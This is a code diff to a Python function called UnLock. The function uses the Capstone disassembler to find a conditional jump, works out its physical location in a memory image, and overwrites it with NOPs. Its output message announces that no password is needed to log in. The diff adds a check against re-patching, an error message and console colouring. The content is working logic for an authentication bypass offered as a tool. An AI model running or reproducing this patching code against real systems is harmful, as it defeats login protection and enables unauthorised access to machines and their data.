@@ -64,12 +64,15 @@ def UnLock(vtero):
     BuffOffset = insnHandle.ToInt64()
     insn_size = System.Runtime.InteropServices.Marshal.SizeOf(insn)
     PatchAddr = 0
+    NopCnt = 0
     #find the last jne (I hope this is multi-version :)
     while curr < count:
         InsnPointer = IntPtr(BuffOffset)
         cs = PtrToStructure(InsnPointer, cs_insn)
         if cs.mnemonic == "jne":
             PatchAddr = cs.address
+        if cs.mnemonic == "nop":
+            NopCnt += 1
         #print "[" + cs.address.ToString("x") + "] [" + cs.bytes[0].ToString("x") +"] " + cs.mnemonic + " " + cs.operands
         curr += 1
         BuffOffset += insn_size
@@ -78,7 +81,12 @@ def UnLock(vtero):
     Capstone.cs_close(disHandle)
     Capstone.cs_free(insnHandle.Value, count)
     if PatchAddr == 0:
+        print "Unable to find patch location"
         return
+    if NopCnt >= 6:
+        print "It seems patch is already applied?"
+        return
+    Console.ForegroundColor = ConsoleColor.Cyan
     # locate and patch NOP bytes 
     hw = p.MemAccess.VirtualToPhysical(p.CR3Value, PatchAddr)
     file_block_offset = p.MemAccess.OffsetToMemIndex(hw.NextTable_PFN)
@@ -88,5 +96,5 @@ def UnLock(vtero):
     writer.Seek(FileAddr, SeekOrigin.Begin)
     writer.Write(NopArr, 0, NopArr.Length)
     writer.Close()
-    print "PATCH COMPLEATED, NO MORE PASSWORD NEEDED TO LOGIN... DO NOT RUN THIS SCRIPT MORE THAN ONCE!"
-    #return FileAddr
+    print "PATCH COMPLETED, NO MORE PASSWORD NEEDED TO LOGIN..."
+    Console.ForegroundColor = ConsoleColor.White
